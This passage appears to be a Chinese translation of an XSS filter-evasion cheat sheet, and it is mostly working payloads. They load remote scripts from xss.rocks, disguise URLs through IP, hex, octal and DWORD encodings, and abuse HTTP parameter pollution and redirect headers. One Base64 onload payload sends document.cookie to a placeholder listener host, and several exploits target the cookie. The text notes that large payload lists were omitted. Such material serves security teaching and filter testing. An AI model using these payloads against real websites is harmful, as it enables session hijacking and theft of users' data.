<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

### 使用 HTML 引号封装的 XSS

这种攻击最初在 IE 中测试，因此效果可能因浏览器而异。对于在允许 `<SCRIPT>` 但不允许 `<SCRIPT SRC...` 的站点上执行 XSS（通过正则表达式过滤器 `/\<script\[^\>\]+src/i`），请执行以下操作：

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

如果你在允许 `<SCRIPT>` 但不允许 `\<script src...`（由于正则表达式过滤器 `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`）：

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

绕过相同过滤器的另一个 XSS：`/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`：

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

绕过相同过滤器的另一个 XSS：`/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`

通常，我们不讨论缓解技术，但阻止这个 XSS 示例的唯一方法是，如果你仍然想允许 `<SCRIPT>` 标签但不允许远程脚本，请使用状态机（当然，如果他们允许 `<SCRIPT>` 标签，还有其他方法可以绕过）：

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

最后一个绕过 `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` 的 XSS 攻击，使用反引号（再次强调，在 Firefox 中不起作用）：

```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

这是一个 XSS 示例，如果正则表达式无法捕获匹配的引号对，而是找到任何引号来不正确地终止参数字符串：

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

这个 XSS 仍然让我担心，因为在不阻止所有活动内容的情况下几乎不可能阻止：

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### URL 字符串规避

如果以编程方式禁止 `http://www.google.com/`，则以下攻击有效：

#### IP 与主机名

```html
<A HREF="http://66.102.7.147/">XSS</A>
```

#### URL 编码

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### DWORD 编码

注意：DWORD 编码有其他变体 - 有关更多详细信息，请参阅下面的 IP 混淆计算器：

```html
<A HREF="http://1113982867/">XSS</A>
```

#### 十六进制编码

每个数字的总大小在大约 240 个字符左右，正如你在第二个数字上看到的，由于十六进制数在 0 到 F 之间，第三个十六进制引号上的前导零不是必需的：

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

#### 八进制编码

### 再次填充是允许的，尽管每个类必须保持在 4 个字符以上 - 如类 A、类 B 等：

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

#### Base64 编码

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

#### 混合编码

让我们混合和匹配基本编码，并加入一些制表符和换行符（为什么浏览器允许这个，我永远不会知道）。制表符和换行符仅在用引号封装时有效：

```html
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>
```

#### 协议解析绕过

`//` 转换为 `http://`，可以节省更多字节。当空间是个问题时这非常方便（减少两个字符可以走很长的路），并且可以轻松绕过正则表达式如 `(ht|f)tp(s)?://`（感谢 Ozh 提供部分内容）。你还可以将 `//` 更改为 `\\\\`。但是，你需要保持斜杠的位置，否则这将被解释为相对路径 URL：

```html
<A HREF="//www.google.com/">XSS</A>
```

#### 删除 CNAME

与上面的 URL 结合，删除 `www.` 将额外节省 4 个字节，对于正确设置的服务器，总共节省 9 个字节：

```html
<A HREF="http://google.com/">XSS</A>
```

绝对 DNS 的额外点：

```html
<A HREF="http://www.google.com./">XSS</A>
```

#### JavaScript 链接位置

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

#### 内容替换作为攻击向量

假设 `http://www.google.com/` 被程序化地替换为空。类似的攻击向量已被用于几个独立的真实世界 XSS 过滤器，通过使用转换过滤器本身（这里是一个例子）来帮助创建攻击向量 `java&\#x09;script:` 被转换为 `java	script:`，在 IE 中呈现：

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```

### 使用 HTTP 参数污染辅助 XSS

如果网站上的内容共享流程如下所示实现，这种攻击将起作用。有一个 `Content` 页面，其中包含一些用户提供的内容，此页面还包含一个指向 `Share` 页面的链接，该页面使用户能够选择他们喜欢的社交分享平台。开发人员在 `Content` 页面中对 `title` 参数进行了 HTML 编码以防止 XSS，但出于某些原因，他们没有对此参数进行 URL 编码以防止 HTTP 参数污染。最后，他们决定由于 `content_type` 的值是常量并且将始终是整数，因此他们没有在 `Share` 页面中对 `content_type` 进行编码或验证。

#### Content 页面源代码

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

#### Share 页面源代码

```js
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//这里可能有一些用户协议和发送到服务器的逻辑
...
</script>
```

#### Content 页面输出

如果攻击者将不可信的内容标题设置为 `This is a regular title&content_type=1;alert(1)`，则 `Content` 页面中的链接将是：

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```

#### Share 页面输出

而在 share 页面输出可能是：

```js
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//这里可能有一些用户协议和发送到服务器的逻辑
…
</script>
```

因此，在这个示例中，主要缺陷是在 `Share` 页面中未经适当编码或验证就信任 content_type。HTTP 参数污染可以通过将 XSS 从反射型 XSS 提升到存储型 XSS 来增加 XSS 缺陷的影响。

## 字符转义序列

以下是 HTML 和 JavaScript 中字符 `\<` 的所有可能组合。大多数这些不会开箱即用，但如上所示，在某些情况下许多可以被渲染。

（此处省略了大量转义序列列表，因为篇幅所限）

## 绕过 WAF 的方法 - 跨站点脚本

### 常规问题

#### 存储型 XSS

如果攻击者设法通过过滤器，WAF 将无法阻止攻击的进行。

#### JavaScript 中的反射型 XSS

示例：

```js
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```

利用：

```js
/?xss=500); alert(document.cookie);//
```

#### 基于 DOM 的 XSS

示例：

```js
<script> ... eval($\_GET\[xss\]); ... </script>
```

利用：

```js
/?xss=document.cookie
```

#### 通过请求重定向的 XSS

易受攻击的代码：

```js
...
header('Location: '.$_GET['param']);
...
```

以及：

```js
...
header('Refresh: 0; URL='.$_GET['param']);
...
```

这个请求不会通过 WAF：

```html
/?param=<javascript:alert(document.cookie>)
```

这个请求将通过 WAF，并且在某些浏览器中将进行 XSS 攻击：

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### XSS 的 WAF 绕过字符串

（此处省略了大量 WAF 绕过字符串，因为篇幅所限）

### 过滤器绕过警报混淆

（此处省略了大量警报混淆方法，因为篇幅所限）

最后的有效载荷应包括前导和尾随反引号：

```js
&#96;`${alert``}`&#96;
```
